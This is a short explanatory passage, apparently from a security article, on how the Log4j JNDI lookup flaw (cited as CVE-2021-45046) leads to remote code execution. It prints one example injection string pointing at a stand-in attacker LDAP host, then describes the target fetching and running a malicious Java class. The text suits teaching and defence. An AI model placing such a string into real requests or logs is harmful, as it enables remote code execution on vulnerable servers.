
For example:  “$ {jndi:ldap://malicious-server.host/aaa} ”
A vulnerable version of Log4j then takes that request and attempts to contact “malicious-server.host” with an LDAP query.
Should the connection be successful, the “malicious-server.host” under the attacker's control replies to the query by inserting a malicious Java class file location into the directory data.
The Java implementation on the target then downloads the malicious Java class file and executes it.
How does the remote code execution exploit work - CVE-2021-45046?
Once a target has been selected, an attacker adds a JNDI query to a connection request to that target in a field that is likely to get logged via Log4j.